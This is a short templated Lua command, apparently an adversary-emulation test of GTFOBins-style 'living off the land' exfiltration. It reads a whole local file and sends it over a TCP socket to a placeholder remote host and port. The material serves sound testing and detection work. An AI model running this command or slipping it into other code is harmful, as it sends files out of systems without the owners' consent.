lua -e '
  local f=io.open("#{lotl_gtfobins_input_file}", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("#{lotl_gtfobins_remote_host}",#{lotl_gtfobins_remote_port});
  t:send(d);
  t:close();'

